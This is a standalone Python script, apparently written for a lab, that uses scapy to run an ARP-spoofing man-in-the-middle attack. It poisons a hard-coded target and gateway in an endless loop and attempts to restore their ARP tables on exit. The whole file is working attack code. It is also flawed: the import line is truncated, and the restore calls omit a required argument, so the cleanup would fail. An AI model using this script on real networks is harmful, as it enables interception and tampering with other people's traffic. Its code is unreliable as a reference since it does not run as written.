mport scapy.all as scapy


import time


import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose= False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)


def restore(destination_ip, source_ip, source_mac):
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP (op=2, pdst=destination_ip, hwdst = destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip="10.0.2.4"
gateway_ip="10.0.2.1"
target_mac = get_mac(target_ip)
destination_mac = get_mac(gateway_ip)
sent_packet_count = 0

try:
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, destination_mac)
        sent_packet_count += 2
        print("\r [+] Packets Sent:" + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)

except  KeyboardInterrupt:
    print(" \n [+] Detected CTRL + C ... Resetting ARP Tables, please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip,target_ip)